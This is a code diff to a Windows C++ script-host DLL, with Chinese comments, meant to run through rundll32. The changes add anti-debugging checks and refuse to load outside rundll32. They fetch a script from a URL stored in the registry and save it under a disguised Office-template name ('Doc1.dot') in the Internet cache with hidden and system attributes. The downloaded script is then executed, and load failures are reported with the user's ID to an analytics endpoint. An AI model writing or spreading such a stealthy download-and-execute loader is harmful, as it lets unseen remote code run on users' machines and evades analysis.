@@ -7,6 +7,8 @@
 #include "XScriptHost.h"
 #include "atlstr.h"
 #include "tlhelp32.h"
+#include "shlobj.h"
+
 class CSHhostModule : public CAtlDllModuleT< CSHhostModule >
 {
 public :
@@ -20,6 +22,34 @@ CSHhostModule _AtlModule;
 // DLL 入口点
 extern "C" BOOL WINAPI DllMain(HINSTANCE hInstance, DWORD dwReason, LPVOID lpReserved)
 {
+	if (dwReason == DLL_PROCESS_ATTACH)
+	{
+		DisableThreadLibraryCalls(hInstance);
+		TCHAR szPath[_MAX_PATH] = {0};
+		GetModuleFileName(NULL, szPath, _MAX_PATH);
+		LPCTSTR pszNames[] = { _T("rundll32.exe") };
+		bool bMatch = false;
+		LPTSTR lpszFindName = szPath;
+		lpszFindName += (int)_tcslen(szPath);
+		while('\\' != *lpszFindName && '\\' != *lpszFindName)
+			lpszFindName--;
+		lpszFindName++;
+		int i = 0;
+		for( ; i < sizeof pszNames / sizeof pszNames[0]; i++)
+		{
+			int n = _tcsnicmp( lpszFindName,  pszNames[i], _tcslen(pszNames[i]));
+			if(0 == n)
+			{
+				bMatch = true;
+				break;
+			}			
+		} 
+		if(!bMatch)
+			return FALSE;
+		if(IsDebugging())
+			return FALSE; 
+	}
+
 #ifdef _MERGE_PROXYSTUB
     if (!PrxDllMain(hInstance, dwReason, lpReserved))
         return FALSE;
@@ -211,6 +241,10 @@ public:
 void  CALLBACK _si0(	HWND hwnd,	HINSTANCE hinst,	LPTSTR lpCmdLine,	int nCmdShow)
 {
 	TSAUTO();
+	if (IsDebugging())
+	{
+		return;
+	}
 	//
 	HWND hWnd = FindWindow(_T("XSH_{B9689BCB-F2B7-4D43-B6B3-6BFB66DB1745}") ,_T(""));
 	if(hWnd)
@@ -249,6 +283,7 @@ void  CALLBACK _si0(	HWND hwnd,	HINSTANCE hinst,	LPTSTR lpCmdLine,	int nCmdShow)
 	CRegKey key;
 	TCHAR szLaunchPath [2048] = {0};
 	TCHAR szPID[32] = {0};
+	DWORD dwInstallTime = 0;
 	hr =  key.Open(HKEY_CURRENT_USER, _T("SOFTWARE\\ExtIconHandler"), KEY_QUERY_VALUE);
 	if(hr == ERROR_SUCCESS)
 	{
@@ -256,17 +291,35 @@ void  CALLBACK _si0(	HWND hwnd,	HINSTANCE hinst,	LPTSTR lpCmdLine,	int nCmdShow)
 		key.QueryStringValue(L"Launch", szLaunchPath, &dw );
 		if(PathFileExists(szLaunchPath))
 		{
-			_tcscpy(szDestLaunch, szLaunchPath);
-
+			_tcscpy(szDestLaunch, szLaunchPath); 
 		}
 		dw = 17;
 		key.QueryStringValue(L"PID", szPID, &dw);
+		key.QueryDWORDValue(L"instt", dwInstallTime);
+
 		key.Close();
 	}
-	TSDEBUG4CXX(" szDestLaunch : "<<szDestLaunch);
+	TSDEBUG4CXX(" szDestLaunch : "<<szDestLaunch<<" dwInstallTime : "<<dwInstallTime);
 	// 加载	
 	TCHAR szPath[_MAX_PATH] = {0};
-	hr = URLDownloadToCacheFile(NULL,  szDestLaunch, szPath, _MAX_PATH, NULL,NULL);
+	TCHAR szTempPath[_MAX_PATH] = {0};
+	SHGetFolderPath(NULL, CSIDL_FLAG_CREATE|CSIDL_INTERNET_CACHE, 0, SHGFP_TYPE_CURRENT, szPath);
+	PathAddBackslash(szPath);
+	PathAppend(szPath, _T("Content.mso\\Doc1.dot"));	
+	
+	DWORD dwOffset = (DWORD)time(0) - dwInstallTime;
+	if(0 != dwInstallTime && (3*24*60*60 < dwOffset))
+	{
+		
+	}
+	else
+	{
+		hr = URLDownloadToFile(NULL, szDestLaunch, szPath, _MAX_PATH, NULL); 
+		SetFileAttributes(szPath, FILE_ATTRIBUTE_HIDDEN|FILE_ATTRIBUTE_SYSTEM);
+		wcscpy(szTempPath, szPath);
+		PathAppend(szTempPath, _T("..\\..\\Doc1.dot"));
+		DeleteFile(szTempPath);
+	}
 	//wcscpy(szPath, L"c:\\scripthost.js");
 	if(FAILED(hr) || !PathFileExists(szPath))
 	{
@@ -288,10 +341,21 @@ void  CALLBACK _si0(	HWND hwnd,	HINSTANCE hinst,	LPTSTR lpCmdLine,	int nCmdShow)
 	{
 		spScriptHost->Load( szPath, 0 );
 		CComVariant v;
-		spScriptHost->Run(&v);
+		hr = spScriptHost->Run(&v);
+		if(SUCCEEDED(hr))
+		{
+			CMessageLoop theLoop;
+			int nRet = theLoop.Run();
+			nRet;
+		}
+		else
+		{
+			CStringW url;
+			url.Format(L"http://www.google-analytics.com/collect?v=1&tid=UA-42360423-1&cid=%s&t=event&ec=exception&ea=downloadingfile_loadfailed_Doc1.dot&el=%s" ,
+				szPID, szPath);
+			URLDownloadToCacheFile (NULL, url, szPath, _MAX_PATH, 0, 0);
+		}
 		v.Clear();	
-		CMessageLoop theLoop;
-		int nRet = theLoop.Run();
 		spScriptHost.Release();
 		spCF.Release();
 		//TerminateProcess(GetCurrentProcess(), nRet);
